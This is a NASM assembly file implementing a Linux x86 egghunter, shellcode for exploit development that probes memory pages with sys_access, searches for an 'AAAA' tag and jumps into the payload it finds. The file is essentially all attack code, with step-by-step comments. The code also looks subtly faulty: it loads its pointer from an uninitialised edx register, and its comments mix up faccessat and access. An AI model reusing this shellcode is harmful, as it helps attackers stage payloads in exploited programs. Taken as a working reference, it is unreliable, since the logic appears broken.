; Filename: egghunter.nasm
; Author: wfscs3
 
global _start
 
section .text
 
_start:

;------------------------------------
; 1.) sys_access
;------------------------------------
; int faccessat(int dirfd, const char 
; *pathname, int mode, int flags);
;------------------------------------
; eax = 0x21 (sys_access)
; ebx = pointer (page?)
;  |
;  V
; eax = result (accessible or not)
;------------------------------------

xor esi, esi         ;clear esi

nextpageloop:
    or si, 0xfff        ;(4095) page size - 1

nextaddrloop:
    inc esi             ;increment esi 
    lea ebx, [esi+0x4]  ;load value in esi + 0x4 into ebx (next page?)
    push 0x21           ;sys_access
    pop eax
    int 0x80            


;--------------------------------------------------
; We now need to check eax to determine if 
; the page is accessible or not.
; 
; as per the sys_access man page an EFAULT (14)
; indicates pathname points outside your accessible 
; address space. Otherwise an ENOENT is returned (2)
;
; 14 = 0xfffffff2 
;---------------------------------------------------

cmp al, 0xf2        ;check for EFAULT
je nextpageloop     ;jump is EFAULT to nextpageloop

;---------------------------------------------------
; if the page is accessible we want to set set our 
; tag 'AAAA', save the pointer to our code, then 
; search through the page for our tag. Finally,
; when found, we jump to our code!
;---------------------------------------------------

mov eax, 0x41414141 ; place our tag (AAAA) into eax
mov edi, edx        ; save pointer to edi
scasd               ; compare edi to our tag in eax 
jne nextaddrloop    ; jump to next address pointer if no match
scasd               ; repeat comparison
jne nextaddrloop    ; repeat increment
jmp edi             ; Found the TAG! jump into code!

;-----------
; THE END
;-----------

